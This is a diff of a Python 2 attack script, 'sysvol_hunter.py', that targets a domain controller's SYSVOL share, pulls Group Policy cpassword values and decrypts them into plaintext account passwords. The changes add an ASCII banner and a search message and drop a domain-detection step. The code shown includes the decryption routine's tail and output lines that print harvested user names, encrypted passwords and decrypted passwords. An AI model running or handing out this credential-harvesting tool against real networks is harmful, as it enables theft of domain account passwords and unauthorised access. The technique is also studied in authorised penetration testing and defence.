@@ -6,11 +6,19 @@
 #Usage           : python sysvol_hunter.py DC_IP
  
 import os
-import socket
 from sys import argv
 from bs4 import BeautifulSoup
 from Crypto.Cipher import AES
 from base64 import b64decode
+
+print """
+   _____                        __   __  __            __           
+  / ___/__  ________   ______  / /  / / / /_  ______  / /____  _____
+  \__ \/ / / / ___/ | / / __ \/ /  / /_/ / / / / __ \/ __/ _ \/ ___/
+ ___/ / /_/ (__  )| |/ / /_/ / /  / __  / /_/ / / / / /_/  __/ /    
+/____/\__, /____/ |___/\____/_/  /_/ /_/\__,_/_/ /_/\__/\___/_/     
+     /____/                                                         
+"""
 
 script,ip = argv
  
@@ -22,9 +30,7 @@ def decrypter(cpassword):
     plain_fn = plain[:-ord(plain[-1])].decode('utf16')
     return plain_fn
  
-print "[+] Detecting Domain Name... "
-domain_name = socket.getfqdn().partition('.')[2]
-print "[+] User Name Found    : %s" %domain_name
+print "[+] Searching on %s .... " %ip
 
 path=[]
 name=[]
@@ -51,6 +57,5 @@ for f_name,f_dir in zip(name,path):
             print "[+] User Name Found    : %s" %user_name
             print "[+] CPassword Found    : %s" %cpass
             print "[+] Password Decrypted : %s" %fn
-        
         else:
             pass
